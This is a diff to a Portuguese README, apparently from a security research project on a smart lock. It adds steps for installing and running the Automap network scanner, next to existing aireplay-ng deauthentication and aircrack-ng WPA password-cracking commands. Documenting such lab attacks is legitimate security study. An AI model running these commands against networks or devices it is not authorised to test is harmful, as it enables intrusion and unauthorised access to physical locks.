@@ -95,7 +95,7 @@ da senha da rede WiFi na qual o dispositivo está conectado, descrevendo os risc
 
 Por meio da utilização do script [Automap](https://github.com/iuribpmoro/Automap) que realizam o reconhecimento, scanning e enumeração da rede, descobre-se, por fim, como operar a fechadura por meio de requisições web, finalizando o processo de ataque.
 
-### Roteiro dos Ataques
+### WiFi Hacking
 #### Setup da Interface
 - Iniciar modo de monitoramento da interface WiFi:
 ```bash
@@ -123,6 +123,21 @@ sudo aireplay-ng -0 2 -a <BSSID_DA_REDE> -c <MAC_DO_DISPOSITIVO>
 - Realize um ataque de força bruta nos pacotes capturados para tentar realizar a quebra da senha:
 ```bash
 sudo aircrack-ng <ARQUIVO>.cap -w <WORDLIST>
+```
+## Scanneando a Rede
+### Instalando o Automap
+- Baixe a ferramenta do github:
+```bash
+git clone https://github.com/iuribpmoro/Automap
+```
+- Rode o script de instalação:
+```bash
+./install.sh
+```
+### Rodando o Automap
+- Rode o scan na rede e em todos os hosts conectados:
+```bash
+./Automap.sh network <REDE> <WORDLIST_DE_DIRETORIOS> -n <NUMERO_DE_PORTAS>
 ```
 
 ## Autores
